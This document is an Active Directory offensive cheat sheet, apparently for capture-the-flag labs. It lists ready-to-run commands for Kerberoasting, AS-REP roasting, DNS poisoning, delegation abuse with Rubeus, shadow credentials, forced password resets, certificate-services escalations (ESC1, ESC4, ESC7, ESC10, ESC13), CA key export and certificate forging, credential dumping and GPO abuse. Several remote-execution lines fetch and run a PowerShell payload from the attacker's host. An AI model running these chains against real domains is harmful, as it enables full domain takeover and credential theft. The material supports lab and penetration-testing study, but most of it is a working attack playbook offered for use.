# Active Directory
## Guide
https://github.com/CravateRouge/bloodyAD/wiki/User-Guide

## Clock Skew Sync
sudo skewme $TARGET

## Ticket Granting Ticket
impacket-getTGT -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD'; kcme

## Bloodhound Data
bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET -op $DC_$TARGET --zip -c All; unzip $DC*_bloodhound.zip -d /Upload/bloodhound
\windows\tasks\Reflect.exe http://$MYIP/windows/Sharphound.exe -c all --ldapusername '$USERNAME' --ldappassword '$PASSWORD'

## List of Usernames and Computers
impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee usernames_$DC
impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee computers_$DC
cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC

## Computers and SIDs
bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=computer)' --attr distinguishedName --attr objectSid | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"

## Users and SIDs
bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=user)' --attr distinguishedName --attr objectSid | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"

## Groups and SIDs
bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=group)' --attr 'distinguishedName' --attr 'objectSid' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"

## Users Belonging to Specific Group and SIDs
bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=user)' --attr distinguishedName --attr objectSid | grep -B1 -A1 'Server Admins' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"

## Account Login Count
bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(&(objectClass=user)(logonCount>=1))' --attr sAMAccountName,logonCount | grep -v 'distinguishedName' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "import sys;from rich.table import Table;from rich.console import Console;l=sys.stdin.read().splitlines();t=Table(show_lines=False);t.add_column('sAMAccountName');t.add_column('logonCount');[t.add_row(l[i+1],l[i])for i in range(0,len(l),2)];Console().print(t)"

## Delegation
impacket-findDelegation -dc-host $DC $DOM/ -k -no-pass

## Ticket: Impersonate
impacket-getTGT -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD'
impacket-getST -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD' -altservice cifs -spn 'time/m3webaw' -impersonate 'Admin.User.Logon'

## ASREPRoast
impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC

## Kerberoast: Users and Computers
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC

## Kerberoast: Targeted
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -no-preauth 'NPUserjjones' -usersfile usernames_$DC
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -no-preauth 'NPUserjjones' -usersfile computers_$DC

## Password Change
impacket-changepasswd $DOM/'$USERNAME:$PASSWORD'@$TARGET -k -p kpasswd -newpass '123qweasdF!'

## DNS: Recon
sudo responder -I tun0 -v
dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action query --record '@'

## DNS: Wildcard Poisoning
dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'

## DNS: Injection
dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'

## Writable
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object User | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat

## Search: Computers
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info

## Search: Users
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info

## Search: Members of Groups
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=group)(member=*))" --attr 'member','sAMAccountName' | sed -E '/^member: /{s/member: //;s/; */;\n/g;s/^/member:\n/;}' | tee out_membersofgroups-info

## Search: Passwords and Keys
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=*))" | grep -a -Ei 'pass|pwd|key'

## ReadGMSAPassword
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword

## ReadLAPSPassword
impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'

## AddKeyCredentialLink
certipy shadow auto -dc-ip $TARGET -target $DC -k -account 'SVC_CABACKUP'

## AddSelf
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; kcme

## Owns
impacket-dacledit -dc-ip $TARGET $DOM/ -k -action 'write' -rights 'WriteMembers' -principal '$USERNAME' -target-dn 'DistinguishedName'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'

## GenericWrite
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'DistinguishedName' servicePrincipalName -v 'http/anything'
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
certipy shadow auto -target $DC -u '$USERNAME' -k -account 'TargetUser'

## ForceChangePassword
impacket-changepasswd $DOM/'TARGET_USER'@$TARGET -newpass '123qweasdF!' -altuser 'USER_WITH_PRIV' -althash '89d0b56874f61ad38bad336a77b8ef2f' -reset
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
impacket-getTGT $DOM/'$USERNAME:123qweasdF!'; kcme

## Remove Protected
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'

## AddAllowedToAct / AllowedToAct
Set-ADComputer -PrincipalsAllowedToDelegateToAccount "OWNED_COMPUTER$" -Identity 'DC_COMPUTER_NAME'
export OWNED_COMPUTER='' # without $ sign
impacket-getTGT $DOM/"$OWNED_COMPUTER$":'$PASSWORD'; kcme
impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache
impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate backupadmin -spn "cifs/$DC"; mv *backupadmin@*.ccache administrator.ccache;
kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:53/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg

$OWNED_COMPUTER='' # without $ sign
Set-ADComputer -PrincipalsAllowedToDelegateToAccount "$OWNED_COMPUTER$" -Identity 'DC_COMPUTER_NAME'
$ComputerSid = Get-DomainComputer "$OWNED_COMPUTER" -Properties objectsid | Select -Expand objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DC_COMPUTER_NAME | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
.\Rubeus.exe hash /password:OWNED_COMPUTER_PASSWORD
.\Rubeus.exe s4u /user:"$OWNED_COMPUTER$" /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:administrator /msdsspn:cifs/dc.rustykey.htb /ptt /nowrap
.\Rubeus.exe s4u /user:"$OWNED_COMPUTER$" /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:backupadmin /msdsspn:cifs/dc.rustykey.htb /ptt /nowrap
[+] Ticket successfully imported!
kirbi2ccache doIGfjCCBnqgAwIBB<SNIP>BASE64 HERE... administrator administrator.ccache;
kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:53/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg

## Forest Trust
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get trusts
impacket-wmiexec -dc-ip $TARGET $DC -k -no-pass "powershell -c \"Import-Module 'ActiveDirectory'; @(Get-ADDomain | Select @{n='Name';e={$_.DNSRoot}},@{n='securityIdentifier';e={$_.DomainSID}},@{n='trustType';e={'Primary'}},@{n='trustDirection';e={'Inbound/Outbound'}}; Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -Properties * | Select @{n='Name';e={$_.Name}},@{n='securityIdentifier';e={$_.securityIdentifier}},@{n='trustType';e={switch ($_.trustType){1{'NT'}2{'Active Directory'}3{'External'}default{$_}}}},@{n='trustDirection';e={switch ($_.trustDirection){1{'Inbound'}2{'Outbound'}3{'Bidirectional'}default{$_}}}}) | Format-Table -AutoSize\""

## Add
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' 'USER'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set owner 'DistinguishedName' 'USER'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add user 'myuser' '123qweasdF!'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add computer 'mypc' '123qweasdF!'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add rbcd 'TARGET' 'SERVICE'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dcsync 'TRUSTEE'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example' '8.8.8.8'

## Execute Commands: WINRM
evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http

## Permissions
adminCount
AllExtendedRights
description
displayName
distinguishedName
ForceChangePassword
GenericAll
GenericWrite
homeDirectory
logonHours
logonWorkstation
member
memberOf
msDS-AllowedToActOnBehalfOfOtherIdentity
msDS-AllowedToDelegateTo
msDS-GroupMSAMembership
msDS-KeyCredentialLink
msDS-ManagedPassword
msDS-PrimaryComputer
primaryGroupID
profilePath
ResetPassword
sAMAccountName
scriptPath
Self
servicePrincipalName
tokenGroups
unicodePwd
UserAccountControl
ValidatedMSDS-AllowedToActOnBehalfOfOtherIdentity
ValidatedSPN
WriteDacl
WriteOwner

# Active Directory: CS
## Guide
https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage

## .ccache
impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
impacket-getTGT $DOM/'$USERNAME' -hashes ':'; kcme

## Check Availablility
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs

## Search Vulnerable
certipy find -k -target $DC -dc-ip $TARGET -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'

## AddKeyCredentialLink
certipy shadow auto -k -target $DC -dc-ip $TARGET -account 'SVC_CABACKUP'

## ESC1
adminSid=$(certipy account -k -target $DC -dc-ip $TARGET -user 'administrator' read 2>/dev/null | grep 'objectSid' | cut -d ':' -f2 | xargs -n1); certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -upn 'administrator' -sid "$adminSid" -key-size '4096'
certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator.pfx'
change_password administrator 123qweasdF!
impacket-getTGT $DOM/'administrator:123qweasdF!'; kcme
evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
evil-winrm-py -i $TARGET -u 'administrator' -p '123qweasdF!'

## ESC4
certipy template -k -target $DC -dc-ip $TARGET -template '' -write-default-configuration

## ESC7
certipy ca -k -target $DC -dc-ip $TARGET -ca "$CA" -add-officer '$USERNAME'
certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'SubCA' -upn 'administrator' -key-size '4096' <<< 'y' | grep -v '[-]' | tee /dev/tty | awk '/Request ID is/ {printf "[*] Now use \x27%s.key\x27 in the following requests as -issue-request \x27%s\x27 and -retrieve \x27%s\x27\n", $5, $5, $5}'
certipy ca -k -target $DC -dc-ip $TARGET -ca "$CA" -issue-request ''
certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -retrieve ''
certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'administrator.pfx'
kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['

## ESC10
certipy account update -k -target $DC -dc-ip $TARGET -user 'WRITEABLE_UPN' -upn 'DC01$@$DOM'
certipy req -k -dc-ip $IP -target $DC -ca $CA -template 'User'
certipy account update -k -target $DC -dc-ip $TARGET -user 'WRITEABLE_UPN' -upn 'ORIGINAL_UPN@$DOM'
certipy auth -pfx DC01.pfx -dc-ip $IP -ldap-shell
set_rbcd DC01$ WRITEABLE_OWNER_USER
impacket-getST -k -no-pass -dc-ip $IP $DOM/'WRITEABLE_OWNER_USER' -spn 'cifs/DC01.mirage.htb' -impersonate DC01$
impacket-secretsdump -k -no-pass $DC -just-dc-user Administrator

## ESC13
certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'VulnerableTemplate' -upn 'NEW_UPN' -key-size 4096
certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'generated.pfx'; kcme
certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'DifferentTemplate' -key-size 4096
certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'generated.pfx'; kcme
impacket-reg -dc-ip $TARGET $DOM -k -no-pass backup -o '\programdata'
evil-winrm --> login --> cd \programdata; download SAM.save ... SECURITY.save ... SYSTEM.save ...
impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local
impacket-secretsdump DC01$@$DC -hashes '$MACHINE.ACC_HASH' -just-dc-ntlm

## Request
certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -upn 'Administrator' -target $DC -key-size '4096'
certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -dynamic-endpoint

## Forge
certutil -store my
certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator_forged.pfx'
change_password administrator 123qweasdF!
impacket-getTGT $DOM/'administrator:123qweasdF!'; kcme
evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
evil-winrm -i '$TARGET' -u 'administrator' -p '123qweasdF!'

## Authenticate
certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator.pfx'
change_password administrator 123qweasdF!
impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
impacket-getTGT $DOM/'administrator' -hashes ':'; kcme
evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
evil-winrm -i $TARGET -u administrator -H ''

## Crack
pfx2john user.pfx
openssl pkcs12 -in user.pfx -nocerts -out auth.key-enc
openssl rsa -in auth.key-enc -out auth.key
openssl pkcs12 -in user.pfx -clcerts -nokeys -out auth.crt
evil-winrm -i $TARGET -S -k auth.key -c auth.crt

# Active Directory: GPO
## Get
Get-GPO -All
Get-GPO -Name "Default Domain Controllers Policy"

## Permissions
Get-GPPermission -Name "Default Domain Controllers Policy" -All
Get-GPPermission -Name "Default Domain Controllers Policy" -TargetName "GPO Managers" -TargetType Group

## Execute
python3 pygpoabuse.py -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -taskname 'Custom Task' -gpo-id '6ac1786c-016f-11d2-945f-00c04fb984f9'
gpupdate /force
impacket-getTGT $DOM/'myadmin':'123qweasdF!'; kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
